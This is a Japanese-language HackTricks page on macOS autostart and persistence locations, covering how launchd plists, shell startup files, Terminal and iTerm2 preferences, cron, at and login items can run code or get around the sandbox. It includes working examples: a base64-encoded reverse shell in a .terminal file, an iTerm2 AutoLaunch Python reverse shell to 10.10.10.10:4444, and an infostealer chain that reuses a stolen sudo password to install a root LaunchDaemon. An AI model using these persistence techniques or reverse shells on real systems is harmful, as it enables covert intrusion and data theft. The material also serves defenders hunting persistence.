# macOS 自動起動

{{#include ../banners/hacktricks-training.md}}

このセクションは、ブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) に大きく基づいています。目的は、**より多くの自動起動場所**を（可能であれば）追加し、macOS の最新バージョン（13.4）で**現在も機能する technique**を示し、必要な**権限**を明記することです。

## Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass**に役立つ起動場所を紹介します。root 権限を必要とせず、**ファイルに書き込む**だけで何かを実行し、非常に**一般的な**アクション、決められた**時間**の経過、または sandbox 内から通常実行できる**アクション**を待つことができます。

### Launchd

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **トリガー**: 再起動
- root 必須
- **`/Library/LaunchDaemons`**
- **トリガー**: 再起動
- root 必須
- **`/System/Library/LaunchAgents`**
- **トリガー**: 再起動
- root 必須
- **`/System/Library/LaunchDaemons`**
- **トリガー**: 再起動
- root 必須
- **`~/Library/LaunchAgents`**
- **トリガー**: 再ログイン
- **`~/Library/LaunchDemons`**
- **トリガー**: 再ログイン

> [!TIP]
> 興味深い事実として、**`launchd`**には Mach-o のセクション `__Text.__config` に埋め込まれた property list があり、launchd が起動する必要のある、その他のよく知られたサービスが含まれています。さらに、これらのサービスには `RequireSuccess`、`RequireRun`、`RebootOnSuccess` を含めることができ、これはそれらが実行され、正常に完了しなければならないことを意味します。
>
> もちろん、code signing のため変更することはできません。

#### Description & Exploitation

**`launchd`**は、起動時に OX S kernel によって実行される**最初の****process**であり、シャットダウン時に終了する最後の process です。常に **PID 1** である必要があります。この process は、以下にある **ASEP** **plists** に記載された設定を**読み取り、実行**します。

- `/Library/LaunchAgents`: admin によってインストールされたユーザーごとの agents
- `/Library/LaunchDaemons`: admin によってインストールされたシステム全体の daemons
- `/System/Library/LaunchAgents`: Apple が提供するユーザーごとの agents。
- `/System/Library/LaunchDaemons`: Apple が提供するシステム全体の daemons。

ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents` および `/Users/$USER/Library/LaunchDemons` にある plists が、**ログインしたユーザーの権限**で起動されます。

**agents と daemons の主な違いは、agents がユーザーのログイン時にロードされ、daemons がシステム起動時にロードされることです**（ssh のように、ユーザーがシステムにアクセスする前に実行する必要があるサービスが存在するためです）。また、agents は GUI を使用できますが、daemons はバックグラウンドで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**ユーザーがログインする前に** **agent を実行する必要がある**ケースがあり、これらは **PreLoginAgents** と呼ばれます。例えば、ログイン時に支援技術を提供する場合に便利です。これらは `/Library/LaunchAgents` にもあります（例については[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照）。

> [!TIP]
> 新しい Daemons または Agents の設定ファイルは、**次回の再起動後、または** `launchctl load <target.plist>` **を使用した後にロードされます**。拡張子なしの `.plist` ファイルを `launchctl -F <file>` でロードすることも**可能です**（ただし、これらの plist ファイルは再起動後に自動的にロードされません）。\
> `launchctl unload <target.plist>` で**アンロード**することも**可能です**（指定されたプロセスは終了します）。
>
> **Agent** または **Daemon** の**実行を妨げる**もの（override など）が**存在しないことを確認するには**、次を実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

現在のユーザーによってロードされているすべての agents と daemons を一覧表示します：
```bash
launchctl list
```
#### Example malicious LaunchDaemon chain (password reuse)

最近の macOS infostealer は、**取得した sudo password** を再利用して、ユーザー agent と root LaunchDaemon を配置しました:<sup>[[1]](#references)</sup>

- agent loop を `~/.agent` に書き込み、実行可能にする。
- その agent を指す plist を `/tmp/starter` に生成する。
- 盗んだ password を `sudo -S` で再利用し、`/Library/LaunchDaemons/com.finder.helper.plist` にコピーして `root:wheel` を設定し、`launchctl load` でロードする。
- `nohup ~/.agent >/dev/null 2>&1 &` で agent を静かに起動し、出力を detach する。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plistがユーザーによって所有されている場合、たとえdaemonのシステム全体用フォルダ内にあっても、**taskはrootではなくそのユーザーとして実行されます**。これにより、一部の権限昇格攻撃を防げる可能性があります。

#### launchdの詳細

**`launchd`**は、**kernel**から起動される最初の**user mode process**です。プロセスの起動は**成功しなければならず**、**終了またはクラッシュすることはできません**。さらに、一部の**kill signal**からも**保護**されています。

`launchd`が最初に行うことの1つは、次のようなすべての**daemon**を**起動**することです。

- **実行時刻に基づくTimer daemon:**
- atd (`com.apple.atrun.plist`): 30分間隔の`StartInterval`を持つ
- crond (`com.apple.systemstats.daily.plist`): 00:15に起動する`StartCalendarInterval`を持つ
- **Network daemon:**
- `org.cups.cups-lpd`: TCP（`SockType: stream`）で待ち受け、`SockServiceName: printer`を使用する
- SockServiceNameはポート、または`/etc/services`に定義されたserviceでなければならない
- `com.apple.xscertd.plist`: TCPの1640番ポートで待ち受ける
- **指定されたpathが変更されたときに実行されるPath daemon:**
- `com.apple.postfix.master`: path `/etc/postfix/aliases`を監視する
- **IOKit notification daemon:**
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices`エントリで`com.apple.xscertd.helper`という名前を示している
- **UserEventAgent:**
- これは前述のものとは異なります。特定のeventに応答して、launchdにappsをspawnさせます。ただし、この場合に関与する主要なbinaryは`launchd`ではなく`/usr/libexec/UserEventAgent`です。これはSIPで制限されたfolder `/System/Library/UserEventPlugins/`からpluginsをロードします。各pluginは、`XPCEventModuleInitializer` keyでinitializerを指定します。または、古いpluginの場合、その`Info.plist`の`FB86416D-6164-2070-726F-70735C216EC0` keyにある`CFPluginFactories` dictで指定します。

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- ただし、これらのfilesをロードするshellを実行するTCC bypassを持つappを見つける必要がある

#### Locations

- **`~/.zshrc`、`~/.zlogin`、`~/.zshenv.zwc`**、**`~/.zshenv`、`~/.zprofile`**
- **Trigger**: zshでterminalを開く
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
- **Trigger**: zshでterminalを開く
- rootが必要
- **`~/.zlogout`**
- **Trigger**: zshでterminalを終了する
- **`/etc/zlogout`**
- **Trigger**: zshでterminalを終了する
- rootが必要
- さらに存在する可能性がある場所: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bashでterminalを開く
- `/etc/profile`（動作しなかった）
- `~/.profile`（動作しなかった）
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xtermで起動することが想定されるが、xtermは**インストールされておらず**、インストール後も次のerrorが発生する: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Description & Exploitation

`zsh`や`bash`などのshell environmentを開始すると、**特定のstartup filesが実行されます**。macOSは現在、default shellとして`/bin/zsh`を使用します。このshellは、Terminal applicationが起動されたとき、またはSSH経由でdeviceにアクセスしたときに自動的に開始されます。macOSには`bash`と`sh`も存在しますが、使用するには明示的にinvokeする必要があります。<sup>[[2]](#references)</sup>

`man zsh`で読むことができるzshのman pageには、startup filesについての詳しい説明があります。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Re-opened Applications

> [!CAUTION]
> 指定された exploitation の設定を行い、loging-out と loging-in、または reboot を実行しても、私の環境では app を実行できませんでした。（app は実行されていませんでした。これらの操作を行う時点で、実行中である必要があるのかもしれません）

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart 時の applications の再 open

#### Description & Exploitation

再 open するすべての applications は plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup> 内にあります。

そのため、再 open する applications として自分の app を launch させるには、**自分の app を list に追加**するだけです。

UUID は、その directory を listing するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で確認できます。

再 open される applications を確認するには、次のコマンドを実行します:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**アプリケーションをこのリストに追加する**には、次を使用できます：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)

- Sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal は、使用するユーザーの FDA permissions を持つ

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal を開く

#### Description & Exploitation

**`~/Library/Preferences`** には、Applications におけるユーザーの preferences が保存されています。これらの preferences の一部には、**他の applications/scripts を execute** するための configuration を保持できます。<sup>[[5]](#references)</sup>

例えば、Terminal は Startup 時に command を execute できます:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この config は、**`~/Library/Preferences/com.apple.Terminal.plist`** ファイル内で次のように反映されます:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
つまり、システム内の Terminal の環境設定の plist を上書きできる場合、**`open`** 機能を使用して **Terminal を開き、そのコマンドを実行させる**ことができます。

これは CLI から次のように追加できます：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- サンドボックスの bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal を使用して、ユーザーの FDA permissions を取得する

#### Location

- **Anywhere**
- **Trigger**: Terminal を開く

#### Description & Exploitation

[**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) を作成して開くと、**Terminal application** が自動的に起動し、その中で指定された commands を実行します。Terminal app に TCC などの special privileges がある場合、command はその special privileges で実行されます。

次の内容で試してください：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
`**.command**`、`**.tool**`拡張子も使用でき、通常の shell script の内容を記述すると、これらも Terminal で開かれます。

> [!CAUTION]
> Terminal に **Full Disk Access** がある場合、そのアクションを完了できます（実行されたコマンドは terminal window に表示されることに注意してください）。

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- root が必要
- **Trigger**: coreaudiod または computer を再起動
- **`/Library/Audio/Plug-ins/Components`**
- root が必要
- **Trigger**: coreaudiod または computer を再起動
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod または computer を再起動
- **`/System/Library/Components`**
- root が必要
- **Trigger**: coreaudiod または computer を再起動

#### Description

以前の writeup によると、**一部の audio plugins を compile** して load させることが可能です。<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins は、**ファイルの preview を trigger**（Finder でファイルを選択した状態で space bar を押す）し、**そのファイルタイプをサポートする plugin** が install されている場合に execute できます。<sup>[[8]](#references)</sup>

独自の QuickLook plugin を compile し、以前のいずれかの location に配置して load させ、その後、対応するファイルに移動して space を押し、trigger することが可能です。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> user の LoginHook でも root の LogoutHook でも、私の環境では動作しませんでした。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` のようなコマンドを execute できる必要があります
- `~/Library/Preferences/com.apple.loginwindow.plist` に `Lo`cate されています

これらは deprecated ですが、user が login した際に commands を execute するために使用できます。<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は`/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`に保存されています。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root user のものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されています

## Conditional Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass** に役立つ start locations を確認できます。これは、**ファイルに書き込むだけで何かを実行**でき、特定の**programs がインストールされていること、「uncommon」な user の操作、または環境**など、あまり一般的ではない条件を想定するものです。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、`crontab` binary を実行できる必要があります
- または root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接 write access を得るには root が必要です。`crontab <file>` を実行できる場合、root は不要です
- **Trigger**: cron job に依存します

#### Description & Exploitation

次のコマンドで**current user**の cron jobs を一覧表示します:
```bash
crontab -l
```
また、各ユーザーのすべての cron jobs は **`/usr/lib/cron/tabs/`** および **`/var/at/tabs/`** にあります（root権限が必要です）。

MacOS では、**特定の頻度**でスクリプトを実行する複数のフォルダが次の場所にあります：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
そこでは通常の **cron** **jobs**、**at** **jobs**（あまり使用されない）、および **periodic** **jobs**（主に一時ファイルのクリーンアップに使用される）を確認できます。daily periodic jobsは、例えば `periodic daily` で実行できます。<sup>[[10]](#references)</sup>

**user cronjob programatically**を追加するには、次の方法を使用できます：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 は以前、TCC permissions が granted されていた

#### 場所

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **トリガー**: iTerm を開く
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **トリガー**: iTerm を開く
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **トリガー**: iTerm を開く

#### 説明と Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** に保存された Scripts が実行されます。例:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
または:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** にある iTerm2 の設定には、iTerm2 ターミナルを開いたときに**実行するコマンドを指定できます**。

この設定は iTerm2 の設定で構成できます。

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

また、そのコマンドは設定に反映されます。
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
実行する command は次のように設定できます：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**を悪用して任意のコマンドを実行する方法は、ほかにも存在する可能性が非常に高いです。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandboxのバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、xbarがインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility権限を要求する

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbarが実行されたとき

#### Description

人気のプログラムである[**xbar**](https://github.com/matryer/xbar)がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`**にshell scriptを書き込むことで、xbarの起動時に実行させることが可能です:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Hammerspoon がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility の権限を要求する

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: hammerspoon が実行されるとき

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) は、**LUA scripting language** を利用して動作する **macOS** 向けの automation platform です。特に、完全な AppleScript code の統合や shell scripts の実行に対応しており、scripting capabilities を大幅に強化できます。<sup>[[13]](#references)</sup>

この app は `~/.hammerspoon/init.lua` という単一の file を探し、起動するとその script が実行されます。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし BetterTouchTool がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts および Accessibility の権限を要求する

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

このツールでは、特定の shortcut が押されたときに実行するアプリケーションやスクリプトを指定できる。攻撃者は、**データベース内に独自の shortcut と実行アクションを設定**し、任意のコードを実行させられる可能性がある（shortcut は単にキーを押すだけのものでもよい）。

### Alfred

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし Alfred がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation、Accessibility、さらには Full-Disk access の権限も要求する

#### Location

- `???`

特定の条件が満たされたときにコードを実行できる workflow を作成できる。攻撃者が workflow ファイルを作成し、Alfred に読み込ませることが可能な場合がある（workflow を使用するには premium version の購入が必要）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし ssh が有効化され、使用されている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH は FDA access を使用する

#### Location

- **`~/.ssh/rc`**
- **Trigger**: ssh 経由での Login
- **`/etc/ssh/sshrc`**
- root が必要
- **Trigger**: ssh 経由での Login

> [!CAUTION]
> ssh を有効にするには Full Disk Access が必要:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

デフォルトでは、`/etc/ssh/sshd_config` に `PermitUserRC no` が設定されていない限り、ユーザーが **SSH 経由で Login** すると、スクリプト **`/etc/ssh/sshrc`** と **`~/.ssh/rc`** が実行される。<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし引数付きで `osascript` を実行する必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- **`osascript` を呼び出す exploit payload が保存される**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- root が必要

#### Description

System Preferences -> Users & Groups -> **Login Items** では、**ユーザーが Login したときに実行される項目**を確認できる。\
コマンドラインから、それらの一覧表示、追加、削除が可能である:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらの項目はファイル **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** に保存されます。

**Login items** は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用して指定することもでき、その設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。

### ZIP as Login Item

（Login Items に関する前のセクションを確認してください。これはその拡張です）

**ZIP** ファイルを **Login Item** として保存すると、**`Archive Utility`** がそれを開きます。たとえば、その zip が **`~/Library`** に保存され、バックドアを含む **`LaunchAgents/file.plist`** フォルダが含まれていた場合、そのフォルダが作成され（デフォルトでは存在しません）、plist が追加されます。そのため、次回ユーザーが再度ログインしたときに、plist に指定された **backdoor が実行されます**。

別の方法として、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成することもできます。これにより、LaunchAgents フォルダがすでに存在する場合でも、この手法は機能します。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- sandbox の bypass に便利: [✅](https://emojipedia.org/check-mark-button)
- ただし **`at`** を **execute** する必要があり、**enabled** になっていなければなりません
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** を **execute** する必要があり、**enabled** になっていなければなりません

#### **Description**

`at` tasks は、特定の時刻に実行する **one-time tasks の scheduling** 用に設計されています。cron jobs とは異なり、`at` tasks は実行後に自動的に削除されます。これらの tasks は system reboot 後も保持されるため、特定の条件下では潜在的な security concerns となる点に注意が必要です。<sup>[[16]](#references)</sup>

**default** では **disabled** ですが、**root** user は次のコマンドで **them** を **enable** できます。
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これにより、1時間後にファイルが作成されます:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq`を使用してジョブキューを確認します。
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上記では、スケジュールされた2つのジョブを確認できます。`at -c JOBNUMBER`を使用して、ジョブの詳細を表示できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks が有効になっていない場合、作成された tasks は実行されません。

**job files** は `/private/var/at/jobs/` にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
